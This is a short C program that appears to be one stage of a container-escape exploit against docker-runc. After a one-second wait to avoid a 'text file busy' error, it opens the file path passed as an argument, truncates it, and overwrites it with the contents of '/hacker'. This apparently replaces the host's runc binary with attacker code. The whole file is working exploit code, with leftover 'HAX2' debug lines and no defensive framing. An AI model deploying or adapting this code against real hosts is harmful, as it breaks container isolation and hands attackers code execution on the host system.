#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>

#define BUF_SIZE 1024

int main(int argc, char **argv) {
    int inputFd, outputFd;
    ssize_t numRead;
    char buf[BUF_SIZE];
//    setbuf(stdout, NULL);

//    printf("HAX2: argv: %s\n", argv[1]);
    sleep(1); // sleep for a moment to wait kernel cleanup docker-runc exec, otherwise the following open would get ETXTBSY err.
    outputFd = open(argv[1], O_CREAT | O_WRONLY | O_TRUNC);
    if (outputFd == -1) {
        printf("opening file %s failed with err:%d\n", argv[1], errno);
        return errno;
    }
//   printf("HAX2: fd: %d\n", outputFd);

    inputFd = open("/hacker", O_RDONLY);
     if (inputFd == -1) {
         printf("opening file %s failed with err:%d\n", "/hacker", errno);
         goto ERR;
     }

     while ((numRead = read(inputFd, buf, BUF_SIZE)) > 0) {
         if (write(outputFd, buf, numRead) != numRead) {
             printf("couldn't write whole buffer");
	     break;
         }
     }

ERR:
     close(inputFd);
     close(outputFd);
     return errno;
}
